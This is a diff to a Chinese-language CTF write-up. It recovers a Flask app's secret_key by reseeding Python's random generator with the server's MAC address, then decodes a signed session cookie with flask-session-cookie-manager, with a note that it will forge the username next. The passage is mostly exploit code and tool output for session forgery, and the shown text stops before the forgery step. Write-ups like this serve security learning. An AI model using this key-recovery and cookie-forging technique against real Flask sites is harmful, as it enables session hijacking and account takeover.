@@ -139,27 +139,25 @@ app.debug = True
 这里我们直接按照逻辑得到`secret_key`
 我们通过脚本可以得到mac对应的key
 ```python
+import uuid
 import random
 
-# 1. 在这里填入你获得的 MAC 地址
-# 格式可以是带冒号的 "02:42:ac:11:00:02" 也可以是纯十六进制 "0242ac110002"
-mac_address_str = "2e:b0:8f:54:a6:f4"
-
-# 2. 处理 MAC 地址格式：去掉冒号或横杠
-clean_mac = mac_address_str.replace(":", "").replace("-", "")
-
-# 3. 将十六进制字符串转换为十进制整数
-# uuid.getnode() 返回的就是这个十进制整数
-seed_value = int(clean_mac, 16)
-
-print(f"使用的 Seed (十进制): {seed_value}")
-
-# 4. 设置相同的种子
-random.seed(seed_value)
-
-# 5. 生成 Key
-# 这一步必须和服务器代码完全一致
-secret_key = str(random.random() * 233)
-
-print(f"计算出的 SECRET_KEY: {secret_key}")
+mac = "2e:b0:8f:54:a6:f4"
+temp = mac.split(':')
+temp = [int(i,16) for i in temp]
+temp = [bin(i).replace('0b','').zfill(8) for i in temp]
+temp = ''.join(temp)
+mac = int(temp,2)
+random.seed(mac)
+randStr = str(random.random()*233)
+print(randStr)
 ```
+(注意这里还只有用python2跑脚本，不知道为什么，python3跑精度不一样)没有环境可以用在线网站跑
+https://www.jyshare.com/compile/6/
+```bash
+PS D:\webtool\flask-session-cookie-manager> python flask_session_cookie_manager3.py  decode -c 'eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.aUWTbQ.0TPXGKzeVGnMLGVPXIYTyxqUHcs' -s '74.8534422833'
+{'username': b'www-data'}
+PS D:\webtool\flask-session-cookie-manager> python flask_session_cookie_manager3.py  decode -c 'eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.aUWTbQ.0TPXGKzeVGnMLGVPXIYTyxqUHcs' -s '74.8534422833095'
+[Decoding error] Signature b'0TPXGKzeVGnMLGVPXIYTyxqUHcs' does not match
+```
+我们这里需要`username=fuck`，用工具改一下：
